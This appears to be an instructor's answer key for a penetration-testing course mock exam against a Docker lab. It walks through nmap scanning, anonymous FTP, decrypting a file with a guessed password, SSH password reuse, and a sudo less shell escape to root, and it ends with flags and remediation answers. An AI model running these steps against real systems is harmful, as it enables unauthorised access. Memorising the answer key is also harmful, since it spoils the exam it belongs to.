# Week 10 Mock Exam — Walkthrough & Answer Key

> Verified against live containers. Not for student distribution.

---

## Setup

```bash
cd labs/week10-mock
docker compose up -d
docker exec -it week10mock-attacker bash
```

Wait ~30-40 seconds for the FTP and SSH targets to finish provisioning
(apt installs, user creation) before starting.

---

## Phase 1: Reconnaissance

```bash
nmap -sn 10.10.50.0/24
nmap -p 21,22,80 10.10.50.0/24
```

**Verified result:** three hosts up besides the attacker itself —
`10.10.50.10` (80/tcp open), `10.10.50.11` (21/tcp open), `10.10.50.12`
(22/tcp open).

---

## Phase 2: Web Enumeration

```bash
curl http://10.10.50.10
```

**Verified result:** the rendered page lists three staff members (Priya
Nandakumar, Marcus Webb, James Reyes) and the naming convention
(first-initial + surname). The IT admin's actual username, `jreyes`, only
appears in an HTML comment at the bottom of the source — students need to
view source (`curl`, not just a browser's rendered view) to find it,
same recon lesson as Week 8's workstation target.

---

## Phase 3: FTP Enumeration & Decryption

### 3.1 — Connect and pull the files down

Use the `ftp` client directly rather than `curl` — it's the real tool for
the job, and it lands the files on the attacker machine's own disk, which
you need anyway for the decryption step that follows.

```bash
ftp 10.10.50.11
# Name: anonymous   Password: anonymous
ftp> cd pub
ftp> ls
ftp> get welcome.txt
ftp> get backup_notice.txt.enc
ftp> bye

cat welcome.txt
```

**Verified result:** `welcome.txt` states the password policy
("PetName + current year") and names the pet ("Rusty") without spelling
out the year — students have to supply the current year themselves.
Password: **`Rusty2026`**. Both files are now local, in the attacker
container's current directory.

### 3.2 — Why this file needs decrypting at all

`backup_notice.txt.enc` isn't plain text — opening it directly just shows
binary noise. Two things tell you it's deliberately protected, not just a
random binary file: the `.enc` extension (a filename convention, not
proof by itself), and `welcome.txt` explicitly calling it "encrypted."
Any file flagged this way in an engagement is worth decrypting — it's
exactly the kind of thing (credentials, internal memos, configs) an
attacker targets.

### 3.3 — Working out *how* to decrypt it

Don't guess a tool blindly — check the file first:

```bash
file backup_notice.txt.enc
```
**Verified result:** `backup_notice.txt.enc: openssl enc'd data with
salted password` — modern `file` recognises the format directly and
names the tool for you.

If `file` doesn't recognise it (older systems), look at the raw header
bytes yourself:
```bash
xxd backup_notice.txt.enc | head -1
```
**Verified result:** `5361 6c74 6564 5f5f ...` → ASCII `Salted__` — this
exact 8-byte magic string is OpenSSL's own marker for a file made with
`openssl enc` using a password (rather than a raw key). Seeing it tells
you definitively which tool to reach for: `openssl enc -d`.

The header doesn't record which cipher or KDF was used, though — that's
not something you can read off the file. This course has consistently
used `aes-256-cbc` with `-pbkdf2` for this kind of exercise, so try that
combination first:

```bash
openssl enc -aes-256-cbc -pbkdf2 -d -in backup_notice.txt.enc -k Rusty2026
```

**Verified result:** decrypts to a handover memo confirming the `jreyes`
SSH account "still has the temporary password set at onboarding" —
this is the pivot that tells students the FTP-derived password is also
the SSH password (password reuse, the exercise's core teaching point).

---

## Phase 4: SSH Foothold

```bash
ssh jreyes@10.10.50.12
# Password: Rusty2026
whoami
id
cat /home/jreyes/user.txt
```

**Verified result:** login succeeds. `cat /home/jreyes/user.txt` →
**`flag{mock10_ssh_foothold}`**.

---

## Phase 5: Privilege Escalation

```bash
sudo -l
```
**Verified result:**
```
User jreyes may run the following commands on technova-ssh:
    (ALL) NOPASSWD: /usr/bin/less
```

**GTFOBins escalation:**
```bash
sudo less /etc/hostname
# inside less, type:  !/bin/sh
whoami
cat /root/root.txt
```
**Verified result (non-interactive equivalent used for scripted
verification — demonstrate the interactive `!/bin/sh` shell-escape live in
class, since it generalises to reading/writing anything as root, not just
one file):**
```bash
sudo less /root/root.txt
```
→ **`flag{mock10_privesc_complete}`**.

---

## Phase 6: Analysis & Reporting — model answers

1. **Vulnerabilities, in exploited order:**
   1. Username disclosed in an HTML comment on the public web page.
   2. Anonymous FTP access with no authentication.
   3. A weak, guessable password policy (PetName + year) stated in
      plaintext on that same FTP server.
   4. The same password reused across an encrypted file *and* a live SSH
      account.
   5. A sudo NOPASSWD rule on `less`, a program with a documented
      (GTFOBins) shell-escape.
2. **Risk ratings:** HTML comment disclosure — Low; anonymous FTP — Medium;
   weak/reused password policy — High; sudo NOPASSWD less — Critical (direct
   root).
3. **Recommendations:** strip HTML comments/metadata before publishing
   pages; disable anonymous FTP or restrict it to genuinely public files;
   enforce a real password policy (length/complexity/uniqueness, not a
   guessable pattern); never reuse a password across systems; remove
   `less` (or any shell-capable program) from NOPASSWD sudo rules, or
   scope the rule to specific safe arguments only.

**Bonus — password reuse:** a single weak password compromises every
system it's reused on at once — an attacker who cracks it in one place
(here, the encrypted FTP file) gets a skeleton key to everything else,
turning one weak link into a full compromise instead of one.

**Bonus — detection:** the anonymous FTP download of `backup_notice.txt.enc`
by an unrecognised client would be the earliest observable sign — a
properly logged/monitored FTP server flags unexpected anonymous access to
a file explicitly marked as an internal handover memo.

---

## Optional CTF

Both flags verified live:
- `user.txt` (`ssh jreyes@10.10.50.12` → `cat /home/jreyes/user.txt`):
  **`flag{mock10_ssh_foothold}`**
- `root.txt` (`sudo less /root/root.txt`): **`flag{mock10_privesc_complete}`**
